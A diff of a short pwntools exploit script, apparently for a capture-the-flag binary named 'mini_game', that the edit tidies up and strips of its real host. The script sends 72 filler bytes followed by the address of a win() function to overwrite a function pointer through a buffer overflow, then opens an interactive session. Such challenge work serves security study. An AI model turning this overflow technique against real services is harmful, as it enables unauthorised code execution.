@@ -1,37 +1,34 @@
+#!/usr/bin/env python3
 from pwn import *
 
-exe = ELF("mini_game")
+exe = ELF("./mini_game")
 context.binary = exe
-context.arch = 'amd64'
-context.os = 'linux'
+context.arch   = 'amd64'
+context.os     = 'linux'
 
-HOSTNAME = 'offsec.m0lecon.it'
-PORT = 13506
+HOSTNAME = 'HOSTNAME_PLACEHOLDER'
+PORT     = 0  # PORT_PLACEHOLDER
 
+# ── offsets ───────────────────────────────────────────────────────────────────
 OFFSET_TO_FUNCPTR = 72
-
 
 def conn():
     if args.LOCAL:
-        r = process([exe.path])
-    else:
-        r = remote(HOSTNAME, PORT)
-    return r
-
+        return process(exe.path)
+    return remote(HOSTNAME, PORT)
 
 def main():
     r = conn()
 
-    r.recvuntil(b"go?\n")
-
+    # ── exploit phase ─────────────────────────────────────────────────────────
     payload = flat(
-        b'A' * OFFSET_TO_FUNCPTR,
-        p64(exe.sym.win)
+        b'A' * OFFSET_TO_FUNCPTR,   # fill buffer up to func_ptr
+        p64(exe.sym.win),            # overwrite func_ptr with address of win()
     )
+
+    r.recvuntil(b"go?\n")
     r.sendline(payload)
-
     r.interactive()
-
 
 if __name__ == '__main__':
     main()
